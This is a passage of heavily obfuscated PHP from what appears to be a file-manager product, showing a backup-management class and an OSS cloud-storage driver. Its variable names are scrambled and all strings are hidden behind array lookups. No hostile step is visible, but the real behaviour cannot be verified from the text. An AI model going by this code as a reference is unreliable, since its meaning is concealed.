$ŒÃ€¶„»[306]), $»³¾±°’, $“ù«ªÃ); $§ä¿—è = $»è…’ë‡[787]; while ($§ä¿—è < $»è…’ë‡[662]) { if ($§ä¿—è >= 0) { break; } $§ä¿—è++; } } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $‹Ú”Ğæ” =& $_SERVER[ú÷îèÆÜ]; $this->isManual(); self::$name = date($‹Ú”Ğæ”[788]); if (!($âİ•›Ë = Model($‹Ú”Ğæ”[789])->lastItem())) { $âİ•›Ë = $this->initData(); } else { self::$name = $âİ•›Ë[$‹Ú”Ğæ”[42]]; if ($âİ•›Ë[$‹Ú”Ğæ”[790]] == $‹Ú”Ğæ”[98]) { self::$name = date($‹Ú”Ğæ”[264]); $¶Ş¬‘ãí = 0; if (isset($âİ•›Ë[$‹Ú”Ğæ”[346]][$‹Ú”Ğæ”[224]][$‹Ú”Ğæ”[518]])) { $¶Ş¬‘ãí = (int) $âİ•›Ë[$‹Ú”Ğæ”[346]][$‹Ú”Ğæ”[224]][$‹Ú”Ğæ”[518]]; } if (self::$manual == 0 && $âİ•›Ë[$‹Ú”Ğæ”[42]] == self::$name) { Model($‹Ú”Ğæ”[789])->remove($âİ•›Ë[$‹Ú”Ğæ”[452]]); } $âİ•›Ë = $this->initData($¶Ş¬‘ãí, $âİ•›Ë[$‹Ú”Ğæ”[791]]); } else { $this->checkStore($âİ•›Ë[$‹Ú”Ğæ”[791]]); } } self::$option = $âİ•›Ë; } private function isManual() { $…ìö—•Œ = _get($GLOBALS, $_SERVER[ú÷îèÆÜ][792], 0); $…ìö—•Œ = intval($…ìö—•Œ); self::$manual = $…ìö—•Œ && $…ìö—•Œ == 1 ? 1 : 0; } private function initData($ÓîŠ­üÊ = 0, $ƒ—¬öĞ = '') { $ßê£Æë =& $_SERVER[ú÷îèÆÜ]; $¢û®¼ = Model($ßê£Æë[789])->config(); if ($ƒ—¬öĞ && $¢û®¼[$ßê£Æë[791]] != $ƒ—¬öĞ) { $ÓîŠ­üÊ = 0; } $this->checkStore($¢û®¼[$ßê£Æë[791]]); if (self::$manual == 1) { self::$name .= $ßê£Æë[21] . date($ßê£Æë[793]); } $ ¬èı¸Ô = array($ßê£Æë[791] => $¢û®¼[$ßê£Æë[791]], $ßê£Æë[42] => self::$name, $ßê£Æë[790] => 0, $ßê£Æë[794] => $¢û®¼[$ßê£Æë[794]], $ßê£Æë[795] => self::$manual, $ßê£Æë[346] => array($ßê£Æë[796] => array($ßê£Æë[790] => 0), $ßê£Æë[797] => array($ßê£Æë[790] => 0, $ßê£Æë[798] => 0, $ßê£Æë[799] => 0, $ßê£Æë[43] => $ßê£Æë[22], $ßê£Æë[800] => 0, $ßê£Æë[801] => 0), $ßê£Æë[802] => array($ßê£Æë[790] => 0, $ßê£Æë[798] => 0, $ßê£Æë[799] => 0, $ßê£Æë[800] => 0, $ßê£Æë[801] => 0), $ßê£Æë[224] => array($ßê£Æë[790] => 0, $ßê£Æë[803] => 0, $ßê£Æë[804] => 0, $ßê£Æë[805] => 0, $ßê£Æë[806] => 0, $ßê£Æë[518] => $ÓîŠ­üÊ, $ßê£Æë[800] => 0, $ßê£Æë[801] => 0)), $ßê£Æë[800] => time(), $ßê£Æë[801] => 0); $»”½¯š‰ = Model($ßê£Æë[789])->insert($ ¬èı¸Ô); $ ¬èı¸Ô[$ßê£Æë[452]] = $»”½¯š‰; return $ ¬èı¸Ô; } private function checkStore($‹½ÖÎÚ) { $÷ƒê´šß =& $_SERVER[ú÷îèÆÜ]; $ï¦›Ã¸ã = Model($÷ƒê´šß[807])->listData($‹½ÖÎÚ); Model($÷ƒê´šß[807])->checkConfig($ï¦›Ã¸ã); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[ú÷îèÆÜ][789])->findByName(self::$name); } return self::$option; } public static function set($È©õåøá) { $›”—•€– =& $_SERVER[ú÷îèÆÜ]; $™°×Ä°Ï = self::get(); foreach ($È©õåøá as $™¹ºëÇ‚ => $êàš§Ò¼) { $¶™ú­¯ = explode($›”—•€–[20], $™¹ºëÇ‚); $Í¨”ş¨Ç = count($¶™ú­¯); switch ($Í¨”ş¨Ç) { case 1: $™°×Ä°Ï[$¶™ú­¯[0]] = $êàš§Ò¼; break; case 2: $™°×Ä°Ï[$¶™ú­¯[0]][$¶™ú­¯[1]] = $êàš§Ò¼; break; case 3: $™°×Ä°Ï[$¶™ú­¯[0]][$¶™ú­¯[1]][$¶™ú­¯[2]] = $êàš§Ò¼; break; } } Model($›”—•€–[789])->update($™°×Ä°Ï[$›”—•€–[452]], $™°×Ä°Ï); self::$option = $™°×Ä°Ï; return self::$option; } public function keep() { $à´‡ı¤ =& $_SERVER[ú÷îèÆÜ]; $ûÙÜóíä = self::get(); if ($ûÙÜóíä[$à´‡ı¤[346]][$à´‡ı¤[796]][$à´‡ı¤[790]] == $à´‡ı¤[98]) { return; } $this->backupKeep($ûÙÜóíä); self::set(array($à´‡ı¤[808] => 1)); } private function backupKeep($‹«¦È€†) { $¹ö„ÑÎ =& $_SERVER[ú÷îèÆÜ]; if (self::$manual == 1) { return; } $“Ü«É§À = Model($¹ö„ÑÎ[789])->listData(); if (empty($“Ü«É§À)) { return; } $½›á†‹Ô = 0; $ÌèâÇœ¢ = array(); foreach ($“Ü«É§À as $ı¦Í®Ø) { if ($½›á†‹Ô >= 7) { break; } $ÌèâÇœ¢[] = $ı¦Í®Ø[$¹ö„ÑÎ[42]]; $½›á†‹Ô++; } for ($½›á†‹Ô = 0; $½›á†‹Ô < 12; $½›á†‹Ô++) { $ÌèâÇœ¢[] = date($¹ö„ÑÎ[809], strtotime("\x2d{$½›á†‹Ô}\x20\x6d\157\156\x74\x68\x73")); } $ÌèâÇœ¢ = array_unique($ÌèâÇœ¢); $Ä„úó ¥ = Model($¹ö„ÑÎ[810])->get($¹ö„ÑÎ[811]); foreach ($“Ü«É§À as $ı¦Í®Ø) { if (isset($ı¦Í®Ø[$¹ö„ÑÎ[795]]) && $ı¦Í®Ø[$¹ö„ÑÎ[795]] == $¹ö„ÑÎ[98]) { continue; } if (!empty($ı¦Í®Ø[$¹ö„ÑÎ[42]]) && in_array($ı¦Í®Ø[$¹ö„ÑÎ[42]], $ÌèâÇœ¢)) { continue; } Model($¹ö„ÑÎ[789])->remove($ı¦Í®Ø[$¹ö„ÑÎ[452]]); $Œã®Ã‡¥ = $this->backupPath($‹«¦È€†, $Ä„úó ¥); IO::remove($Œã®Ã‡¥, !1); } } private function backupPath($ÌùÆğÛ´, $ãİ»è½â = false) { $¬ƒçÛõ° =& $_SERVER[ú÷îèÆÜ]; if (!$ãİ»è½â) { $ãİ»è½â = Model($¬ƒçÛõ°[810])->get($¬ƒçÛõ°[811]); } $Œ´Ô¡ç = $ÌùÆğÛ´[$¬ƒçÛõ°[42]]; $íÎó—ñá = substr(md5($¬ƒçÛõ°[812] . $ãİ»è½â . $Œ´Ô¡ç), 0, 8); return "\x7b\x69\157\72{$ÌùÆğÛ´[$¬ƒçÛõ°[791]]}\175\x2f\x64\x61\164\141\142\x61\x73\145\57\x62\141\143\153\165\x70\57" . $Œ´Ô¡ç . $¬ƒçÛõ°[21] . $íÎó—ñá; } public function db() { $ÖÉş¥¸ =& $_SERVER[ú÷îèÆÜ]; $äœíÚ—õ = self::get(); if ($äœíÚ—õ[$ÖÉş¥¸[346]][$ÖÉş¥¸[797]][$ÖÉş¥¸[790]] == $ÖÉş¥¸[98]) { return !0; } $îñ°†÷ = new BackupDb(); if (!$îñ°†÷->index()) { return !1; } self::set(array($ÖÉş¥¸[813] => 1)); return !0; } public function dbFile() { $Õ±ıÆÉ¢ =& $_SERVER[ú÷îèÆÜ]; $Ğ£®Åâµ = self::get(); if ($Ğ£®Åâµ[$Õ±ıÆÉ¢[346]][$Õ±ıÆÉ¢[802]][$Õ±ıÆÉ¢[790]] == $Õ±ıÆÉ¢[98]) { return !0; } $·¶ªèı« = new BackupDbFile(); if (!$·¶ªèı«->index()) { return !1; } self::set(array($Õ±ıÆÉ¢[814] => 1)); return !0; } public function file() { $åÁ‚Ä =& $_SERVER[ú÷îèÆÜ]; $É®õ€§Õ = self::get(); if ($É®õ€§Õ[$åÁ‚Ä[346]][$åÁ‚Ä[224]][$åÁ‚Ä[790]] == $åÁ‚Ä[98]) { return !0; } if (!isset($É®õ€§Õ[$åÁ‚Ä[794]]) || $É®õ€§Õ[$åÁ‚Ä[794]] == $åÁ‚Ä[222]) { $¢¥·ø±Ö = new BackupFile(); if (!$¢¥·ø±Ö->index()) { return !1; } } self::set(array($åÁ‚Ä[815] => 1, $åÁ‚Ä[790] => 1)); return !0; } } goto bñãÆÑâ; a¢šëŞ: class PathDriverOOS extends PathDriverBaseS3 { public function __construct($™äãô‡ã) { parent::__construct($™äãô‡ã); $this->signatureVersion($_SERVER[ú÷îèÆÜ][241]); } public function fileOutLink($ÍºÒ¬œ÷) { $»š€°Ÿù =& $_SERVER[ú÷îèÆÜ]; if (substr($ÍºÒ¬œ÷, 0, 7) == $»š€°Ÿù[1371]) { $ÍºÒ¬œ÷ = $»š€°Ÿù[1372] . substr($ÍºÒ¬œ÷, 7); } header($»š€°Ÿù[172] . $ÍºÒ¬œ÷); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public $config = array(); public function __construct($¼½¹×¾Å) { parent::__construct(); include_once SDK_DIR . $_SERVER[ú÷îèÆÜ][1408]; $this->_init($¼½¹×¾Å); } public function _init($ÀòÅÕ±†) { $¡£ı­„Š =& $_SERVER[ú÷îèÆÜ]; $this->config = $ÀòÅÕ±†; foreach ($ÀòÅÕ±† as $ù¬¤×Ùğ => $ä«÷âñ») { if (isset($this->{$ù¬¤×Ùğ})) { $this->{$ù¬¤×Ùğ} = $ä«÷âñ»; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($¡£ı­„Š[1409] . LNG($¡£ı­„Š[1410])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $“Æ¢ôİ =& $_SERVER[ú÷îèÆÜ]; $æ­ÎáÊ = new OSS\Model\CorsConfig(); $ÄÈ®­¸Æ = new OSS\Model\CorsRule(); $ÄÈ®­¸Æ->addAllowedOrigin($“Æ¢ôİ[1411]); $ÄÈ®­¸Æ->addAllowedMethod($“Æ¢ôİ[1412]); $ÄÈ®­¸Æ->addAllowedMethod($“Æ¢ôİ[1413]); $ÄÈ®­¸Æ->addAllowedMethod($“Æ¢ôİ[1414]); $ÄÈ®­¸Æ->addAllowedMethod($“Æ¢ôİ[1415]); $ÄÈ®­¸Æ->addAllowedMethod($“Æ¢ôİ[171]); $ÄÈ®­¸Æ->setMaxAgeSeconds(600); $ÄÈ®­¸Æ->addExposeHeader($“Æ¢ôİ[1416]); $ÄÈ®­¸Æ->addAllowedHeader($“Æ¢ôİ[1411]); $æ­ÎáÊ->addRule($ÄÈ®­¸Æ); try { $this->client->putBucketCors($this->bucket, $æ­ÎáÊ); } catch (OSS\Core\OssException $ƒªíçúú) { return !1; } return !0; } public function getBucketCors() { $‡˜°øÖä =& $_SERVER[ú÷îèÆÜ]; $ŒŞ¿®ì = null; try { $ŒŞ¿®ì = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $¢Œ—‰Ñ¶) { return null; } if (!$ŒŞ¿®ì || !($ˆ³çˆ÷¡ = $ŒŞ¿®ì->getRules())) { return null; } $óñ…Ô‹¨ = $ˆ³çˆ÷¡[0]->getAllowedOrigins(); $Òß™»€è = $ˆ³çˆ÷¡[0]->getAllowedMethods(); $˜úêìÆÅ = $ˆ³çˆ÷¡[0]->getMaxAgeSeconds(); $ªï¾×š¨ = $ˆ³çˆ÷¡[0]->getExposeHeaders(); $«ºÄÅé = $ˆ³çˆ÷¡[0]->getAllowedHeaders(); return array($‡˜°øÖä[212] => isset($óñ…Ô‹¨[0]) ? $óñ…Ô‹¨[0] : $‡˜°øÖä[22], $‡˜°øÖä[216] => $Òß™»€è, $‡˜°øÖä[1417] => $˜úêìÆÅ, $‡˜°øÖä[1418] => isset($ªï¾×š¨[0]) ? $ªï¾×š¨[0] : $‡˜°øÖä[22], $‡˜°øÖä[214] => isset($«ºÄÅé[0]) ? $«ºÄÅé[0] : $‡˜°øÖä[22]); } public function isBucketCors() { $Ù½‹£—’ =& $_SERVER[ú÷îèÆÜ]; $×îÌ¬Èî = $this->getBucketCors(); if (!$×îÌ¬Èî || !is_array($×îÌ¬Èî)) { return !1; } if ($×îÌ¬Èî[$Ù½‹£—’[212]] != $Ù½‹£—’[213] || $×îÌ¬Èî[$Ù½‹£—’[214]] != $Ù½‹£—’[213]) { return !1; } $ÂˆÏšîì = array_map($Ù½‹£—’[215], $×îÌ¬Èî[$Ù½‹£—’[216]]); if (!is_array($ÂˆÏšîì)) { $ÂˆÏšîì = array(); } $¢öüµÅı = array($Ù½‹£—’[217], $Ù½‹£—’[218], $Ù½‹£—’[219], $Ù½‹£—’[220], $Ù½‹£—’[221]); $Á÷¨Èëˆ = array_diff($¢öüµÅı, $ÂˆÏšîì); return empty($Á÷¨Èëˆ); } public function mkfile($‹º®Áíè, $ñÙ¨„ï = '', $®¯’Ç¡ı = REPEAT_RENAME) { $àÁ©…£ = $this->setContent($‹º®Áíè, $ñÙ¨„ï); if ($àÁ©…£ !== !1) { return $this->getPathOuter($‹º®Áíè); } return !1; } public function mkdir($É¡Óüôî, $Ò­ËÃ‹¤ = REPEAT_SKIP) { if ($Ò­ËÃ‹¤ && $this->_isFolder($É¡Óüôî)) { return $this->getPathOuter($É¡Óüôî); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($É¡Óüôî)); } catch (OSS\Core\OssException $ÊÁçÁĞ) { return !1; } return $this->getPathOuter($É¡Óüôî); } private function fileList($ĞÁàÑä, $Á’îˆ¤ß = '', $¼”• = 0) { $üÊ¶Ş”Ş =& $_SERVER[ú÷îèÆÜ]; $ĞÁàÑä = trim($ĞÁàÑä, $üÊ¶Ş”Ş[18]); $šï—ë†Ú = empty($ĞÁàÑä) && $ĞÁàÑä !== $üÊ¶Ş”Ş[222] ? $üÊ¶Ş”Ş[22] : $ĞÁàÑä . $üÊ¶Ş”Ş[18]; $¯Çõ€âË = $üÊ¶Ş”Ş[22]; $«„ğ½•ë = 1000; $šŞ‘í¨” = $êÕÑ‘² = array(); while (!0) { check_abort(); $›ˆ”£ï® = array($üÊ¶Ş”Ş[1419] => $Á’îˆ¤ß, $üÊ¶Ş”Ş[1420] => $šï—ë†Ú, $üÊ¶Ş”Ş[1421] => $«„ğ½•ë, $üÊ¶Ş”Ş[1422] => $¯Çõ€âË); try { $ÇÃ»é§… = $this->client->listObjects($this->bucket, $›ˆ”£ï®); } catch (OSS\Core\OssException $Øãç«½Ò) { break; } $¯Çõ€âË = $ÇÃ»é§…->getNextMarker(); $´¤ÏØ† = $ÇÃ»é§…->getObjectList(); $øå®õìš = $ÇÃ»é§…->getPrefixList(); foreach ($´¤ÏØ† as $æÊ›¥Ì) { if ($æÊ›¥Ì->getKey() == $šï—ë†Ú) { continue; } $€¸ã•Ñ— = $æÊ›¥Ì->getKey(); $›Ì±ó½Ï = $æÊ›¥Ì->getSize(); $á úå = $æÊ›¥Ì->getLastModified(); $ˆ‚åŠº² = trim($æÊ›¥Ì->getETag(), $üÊ¶Ş”Ş[128]); $â³šÖèÜ = $¼”• ? array($üÊ¶Ş”Ş[42] => $€¸ã•Ñ—, $üÊ¶Ş”Ş[86] => $›Ì±ó½Ï, $üÊ¶Ş”Ş[204] => strtotime($á úå), $üÊ¶Ş”Ş[1423] => $ˆ‚åŠº²) : $€¸ã•Ñ—; $¢‘ö„ıÛ = $›Ì±ó½Ï == 0 && substr($€¸ã•Ñ—, strlen($€¸ã•Ñ—) - 1, 1) == $üÊ¶Ş”Ş[18] ? !0 : !1; $ÀÏØ§Ñ… = array($üÊ¶Ş”Ş[86] => $›Ì±ó½Ï, $üÊ¶Ş”Ş[1424] => $›Ì±ó½Ï, $üÊ¶Ş”Ş[95] => strtotime($á úå), $üÊ¶Ş”Ş[1425] => $á úå, $üÊ¶Ş”Ş[1423] => $ˆ‚åŠº²); $this->cacheMethodInfoSet($€¸ã•Ñ—, $¢‘ö„ıÛ, $ÀÏØ§Ñ…); if ($¢‘ö„ıÛ) { $šŞ‘í¨”[] = $€¸ã•Ñ—; continue; } $êÕÑ‘²[] = $â³šÖèÜ; } foreach ($øå®õìš as $­şÒÁ) { $šŞ‘í¨”[] = $­şÒÁ->getPrefix(); $this->cacheMethodInfoSet($­şÒÁ->getPrefix(), !0); } if ($¯Çõ€âË === $üÊ¶Ş”Ş[22]) { break; } } $this->cacheMethodInfoSet($ĞÁàÑä, !0); return array($üÊ¶Ş”Ş[92] => $šŞ‘í¨”, $üÊ¶Ş”Ş[93] => $êÕÑ‘²); } public function copyFile($¸—¢‘¥, $ıÏ½¿¦) { $ƒ­¸È“‡ = $this->size($¸—¢‘¥); if ($ƒ­¸È“‡ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $¸—¢‘¥, $this->bucket, $this->pathEncode($ıÏ½¿¦)); } catch (OSS\Core\OssException $ÂØŞÆÚò) { return !1; } return $this->getPathOuter($ıÏ½¿¦); } $œ«°ÚßÜ = $this->multiCopyObject($¸—¢‘¥, $ıÏ½¿¦, $ƒ­¸È“‡); return $œ«°ÚßÜ ? $this->getPathOuter($ıÏ½¿¦) : !1; } private function multiCopyObject($Í¤¹¦¯¿, $ìóñÑÄ, $ê«³öêÑ) { $°¯²Ù‚ú =& $_SERVER[ú÷îèÆÜ]; try { $ŸÅ«‹Èô = array(); if ($©–´Ø«å = $this->hashMd5($Í¤¹¦¯¿)) { $ŸÅ«‹Èô = array(OSS\OssClient::OSS_HEADERS => array($°¯²Ù‚ú[1426] => $©–´Ø«å)); } $í¡è›ÕÄ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ìóñÑÄ), $ŸÅ«‹Èô); $ùßÏêØù = 1; $™¤”å’ = 0; $å•Ëİ¦ = array(); $éÛè¢õì = 1024 * 1024 * 10; $©°£ÌÛ = $this->client->generateMultiuploadParts($ê«³öêÑ, $éÛè¢õì); foreach ($©°£ÌÛ as $õæ£©ä˜ => $¸Éó¡î) { $”ÕŒáŸ = $™¤”å’ + (int) $¸Éó¡î[$°¯²Ù‚ú[1427]]; $îé÷ÂÕœ = (int) $¸Éó¡î[$°¯²Ù‚ú[390]] + $”ÕŒáŸ - 1; $ıë™ê = array($°¯²Ù‚ú[1428] => $”ÕŒáŸ, $°¯²Ù‚ú[1429] => $îé÷ÂÕœ); $å•Ëİ¦[] = $this->client->uploadPartCopy($this->bucket, $Í¤¹¦¯¿, $this->bucket, $this->pathEncode($ìóñÑÄ), $ùßÏêØù, $í¡è›ÕÄ, $ıë™ê); $ùßÏêØù = $ùßÏêØù + 1; } $±™·¬‚¥ = array(); foreach ($å•Ëİ¦ as $õæ£©ä˜ => $Àâœúô) { $±™·¬‚¥[] = array($°¯²Ù‚ú[1430] => $õæ£©ä˜ + 1, $°¯²Ù‚ú[1431] => $Àâœúô); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($ìóñÑÄ), $í¡è›ÕÄ, $±™·¬‚¥); } catch (OSS\Core\OssException $ğß‰Í¡Ş) { return !1; } return !0; } public function moveFile($ã”¿ı²ş, $ãµñ©ëŒ) { if ($this->copyFile($ã”¿ı²ş, $ãµñ©ëŒ)) { $this->remove($ã”¿ı²ş); return $this->getPathOuter($ãµñ©ëŒ); } return !1; } public function delFile($Ğ–ÙîÏº) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($Ğ–ÙîÏº)); } catch (OSS\Core\OssException $À¥šÎ¼ö) { return !1; } return !0; } public function delFolder($£ƒëßÓö) { $äô©¨ä =& $_SERVER[ú÷îèÆÜ]; if (!$this->exist($£ƒëßÓö)) { return !0; } $this->listItemCache = !1; $ÈÜí®Û = $this->fileList($£ƒëßÓö); $this->listItemCache = !0; $”ÙŸ—ğ› = trim($£ƒëßÓö, $äô©¨ä[18]) . $äô©¨ä[18]; if (!empty($£ƒëßÓö) && $£ƒëßÓö !== $äô©¨ä[222] && !in_array($”ÙŸ—ğ›, $ÈÜí®Û[$äô©¨ä[92]])) { $ÈÜí®Û[$äô©¨ä[92]][] = $”ÙŸ—ğ›; } $À‘µíôÏ = $this->delByBatch($ÈÜí®Û[$äô©¨ä[93]]); if (!$À‘µíôÏ) { return !1; } $À‘µíôÏ = $this->delByBatch($ÈÜí®Û[$äô©¨ä[92]]); if (!$À‘µíôÏ) { return !1; } return $this->delFile($”ÙŸ—ğ›); } private function delByBatch($íÈ•¦î­) { foreach (array_chunk($íÈ•¦î­, 1000) as $•”µ§×·) { try { $this->client->deleteObjects($this->bucket, $•”µ§×·); } catch (OSS\Core\OssException $„ë˜·°º) { return !1; } } return !0; } public function rename($°ªñ¿ô, $“ºı¤…Î) { return $this->renameObject($°ªñ¿ô, $“ºı¤…Î); } private function fileInfo($ŸƒøÖØ, $õâş°® = false, $ÁáÀÅäš = array()) { $êËİšÍ =& $_SERVER[ú÷îèÆÜ]; $ ›¶·şú = array($êËİšÍ[42] => $this->pathThis($ŸƒøÖØ), $êËİšÍ[94] => $this->getPathOuter($ŸƒøÖØ), $êËİšÍ[43] => $êËİšÍ[224], $êËİšÍ[86] => isset($ÁáÀÅäš[$êËİšÍ[86]]) ? $ÁáÀÅäš[$êËİšÍ[86]] : 0, $êËİšÍ[185] => $this->ext($ŸƒøÖØ)); if ($õâş°®) { return $ ›¶·şú; } $ ›¶·şú[$êËİšÍ[225]] = $ ›¶·şú[$êËİšÍ[95]] = 0; $ ›¶·şú[$êËİšÍ[226]] = $ ›¶·şú[$êËİšÍ[227]] = !0; if (empty($ÁáÀÅäš)) { $‡«ª = $this->objectMeta($ŸƒøÖØ); if (!$‡«ª) { return $ ›¶·şú; } $ÁáÀÅäš = array($êËİšÍ[95] => strtotime($‡«ª[$êËİšÍ[1425]]), $êËİšÍ[86] => $‡«ª[$êËİšÍ[1424]] + 0, $êËİšÍ[1423] => $‡«ª[$êËİšÍ[1423]]); } if (isset($ÁáÀÅäš[$êËİšÍ[1423]]) && $ÁáÀÅäš[$êËİšÍ[1423]]) { $ ›¶·şú[$êËİšÍ[229]] = trim($ÁáÀÅäš[$êËİšÍ[1423]], $êËİšÍ[128]); } if (isset($ÁáÀÅäš[$êËİšÍ[86]])) { $ ›¶·şú[$êËİšÍ[86]] = $ÁáÀÅäš[$êËİšÍ[86]]; } if (isset($ÁáÀÅäš[$êËİšÍ[95]])) { $ ›¶·şú[$êËİšÍ[95]] = $ÁáÀÅäš[$êËİšÍ[95]]; } if (isset($ÁáÀÅäš[$êËİšÍ[204]]) && !trim($ ›¶·şú[$êËİšÍ[95]])) { $ ›¶·şú[$êËİšÍ[95]] = $ÁáÀÅäš[$êËİšÍ[204]]; } return $ ›¶·şú; } private function folderInfo($‚ù›ßĞ‰, $ÀÉÍÅ¾¤ = false, $¼æ’¶ = array()) { $è¹²¥ì“ =& $_SERVER[ú÷îèÆÜ]; $ ­»ºõî = array($è¹²¥ì“[42] => $this->pathThis($‚ù›ßĞ‰), $è¹²¥ì“[94] => $this->getPathOuter($è¹²¥ì“[18] . $‚ù›ßĞ‰), $è¹²¥ì“[43] => $è¹²¥ì“[85]); if ($ÀÉÍÅ¾¤) { return $ ­»ºõî; } $ ­»ºõî[$è¹²¥ì“[225]] = $ ­»ºõî[$è¹²¥ì“[95]] = 0; $ ­»ºõî[$è¹²¥ì“[226]] = $ ­»ºõî[$è¹²¥ì“[227]] = !0; if (empty($¼æ’¶)) { $‚ù›ßĞ‰ = rtrim($‚ù›ßĞ‰, $è¹²¥ì“[18]) . $è¹²¥ì“[18]; $—­±Ê›ß = $this->objectMeta($‚ù›ßĞ‰); if (!$—­±Ê›ß) { return $ ­»ºõî; } $¼æ’¶ = array($è¹²¥ì“[225] => $—­±Ê›ß[$è¹²¥ì“[553]][$è¹²¥ì“[1432]], $è¹²¥ì“[95] => strtotime($—­±Ê›ß[$è¹²¥ì“[1425]])); } if (isset($¼æ’¶[$è¹²¥ì“[95]])) { $ ­»ºõî[$è¹²¥ì“[95]] = $¼æ’¶[$è¹²¥ì“[95]]; } if (isset($¼æ’¶[$è¹²¥ì“[225]])) { $ ­»ºõî[$è¹²¥ì“[225]] = $¼æ’¶[$è¹²¥ì“[225]]; } return $ ­»ºõî; } public function listPath($¨êó‡’û, $¶ÜÙ´¹† = false) { $Ê£–ø†í =& $_SERVER[ú÷îèÆÜ]; $¿–œú‡å = $this->fileList($¨êó‡’û, $Ê£–ø†í[18], !0); foreach ($¿–œú‡å[$Ê£–ø†í[92]] as $³Úä€şï => $³¥Ü¨…Ö) { $¿–œú‡å[$Ê£–ø†í[92]][$³Úä€şï] = $this->folderInfo($³¥Ü¨…Ö, $¶ÜÙ´¹†, $³¥Ü¨…Ö); } foreach ($¿–œú‡å[$Ê£–ø†í[93]] as $³Úä€şï => $³¥Ü¨…Ö) { $¿–œú‡å[$Ê£–ø†í[93]][$³Úä€şï] = $this->fileInfo($³¥Ü¨…Ö[$Ê£–ø†í[42]], $¶ÜÙ´¹†, $³¥Ü¨…Ö); } return $¿–œú‡å; } protected function infoChildren($Á¸‰Ú¡ı, &$È†Çè•«) { $ÅŞë·ôŒ =& $_SERVER[ú÷îèÆÜ]; $Š¬…•‚Ä = $this->fileList($Á¸‰Ú¡ı, $ÅŞë·ôŒ[22], !0); $È†Çè•«[$ÅŞë·ôŒ[88]] += count($Š¬…•‚Ä[$ÅŞë·ôŒ[92]]); $È†Çè•«[$ÅŞë·ôŒ[87]] += count($Š¬…•‚Ä[$ÅŞë·ôŒ[93]]); foreach ($Š¬…•‚Ä[$ÅŞë·ôŒ[93]] as $Ùè¥ØŸÖ) { if (!$Ùè¥ØŸÖ || !$Ùè¥ØŸÖ[$ÅŞë·ôŒ[86]]) { continue; } $È†Çè•«[$ÅŞë·ôŒ[86]] += $Ùè¥ØŸÖ[$ÅŞë·ôŒ[86]]; } } public function has($æÊ›‰¶ş, $®¹î”ˆÎ = false, $øÑÜ‘º™ = true) { $ÄÚëÙªæ =& $_SERVER[ú÷îèÆÜ]; $æÊ›‰¶ş = trim($æÊ›‰¶ş, $ÄÚëÙªæ[18]); $íÉ÷‚Üê = empty($æÊ›‰¶ş) && $æÊ›‰¶ş !== $ÄÚëÙªæ[222] ? $ÄÚëÙªæ[22] : $æÊ›‰¶ş . $ÄÚëÙªæ[18]; $ŠĞ™¢¡º = $ÄÚëÙªæ[22]; $â›Òãà = 500; $ú™Ó¨  = $¹—ûˆÈ = 0; while (!0) { check_abort(); $ÛĞ×›ıé = array($ÄÚëÙªæ[1419] => $ÄÚëÙªæ[18], $ÄÚëÙªæ[1420] => $íÉ÷‚Üê, $ÄÚëÙªæ[1421] => $â›Òãà, $ÄÚëÙªæ[1422] => $ŠĞ™¢¡º); try { $–¥é¹‹ì = $this->client->listObjects($this->bucket, $ÛĞ×›ıé); } catch (OSS\Core\OssException $¼©½ÏÜÄ) { break; } $ŠĞ™¢¡º = $–¥é¹‹ì->getNextMarker(); $ä¾ÑÓìò = $–¥é¹‹ì->getObjectList(); $µ—±…ÑÛ = $–¥é¹‹ì->getPrefixList(); if ($®¹î”ˆÎ) { if (count($ä¾ÑÓìò) > 1 || count($ä¾ÑÓìò) == 1 && $ä¾ÑÓìò[0]->getKey() != $íÉ÷‚Üê) { $ú™Ó¨  += count($ä¾ÑÓìò) - 1; } if (!empty($µ—±…ÑÛ)) { $¹—ûˆÈ += count($µ—±…ÑÛ); } if ($ŠĞ™¢¡º === $ÄÚëÙªæ[22]) { break; } continue; } if ($øÑÜ‘º™) { if (!empty($ä¾ÑÓìò)) { if (count($ä¾ÑÓìò) > 1 || $ä¾ÑÓìò[0]->getKey() != $íÉ÷‚Üê) { return !0; } } } else { if (!empty($µ—±…ÑÛ)) { return !0; } } if ($ŠĞ™¢¡º === $ÄÚëÙªæ[22]) { break; } } if ($®¹î”ˆÎ) { return array($ÄÚëÙªæ[233] => $ú™Ó¨ , $ÄÚëÙªæ[234] => $¹—ûˆÈ); } return !1; } public function listAll($èƒñ‹ø) { $ñ¯‚¤ˆÂ =& $_SERVER[ú÷îèÆÜ]; $åÏ²®åÁ = $this->fileList($èƒñ‹ø, $ñ¯‚¤ˆÂ[22], !0); $›ˆñÙ = array_to_keyvalue($åÏ²®åÁ[$ñ¯‚¤ˆÂ[93]], $ñ¯‚¤ˆÂ[42]); foreach ($åÏ²®åÁ[$ñ¯‚¤ˆÂ[92]] as $â‚÷œ™À) { if (is_string($â‚÷œ™À)) { $›ˆñÙ[$â‚÷œ™À] = array($ñ¯‚¤ˆÂ[86] => 0); } } return $this->listAllFiles($èƒñ‹ø, $›ˆñÙ); } public function canRead($½ß½ˆ÷) { $¤Ôã¸ =& $_SERVER[ú÷îèÆÜ]; $¤èƒİ² = $this->pathAcl($½ß½ˆ÷); return $¤èƒİ² == $¤Ôã¸[1433] || $¤èƒİ² == $¤Ôã¸[596] ? !0 : !1; } public function canWrite($ì§¥‡Êú) { $÷·İŞé = $this->pathAcl($ì§¥‡Êú); return $÷·İŞé == $_SERVER[ú÷îèÆÜ][596] ? !0 : !1; } public function pathAcl($´‘Ÿ±) { $ÆüéĞàø =& $_SERVER[ú÷îèÆÜ]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } 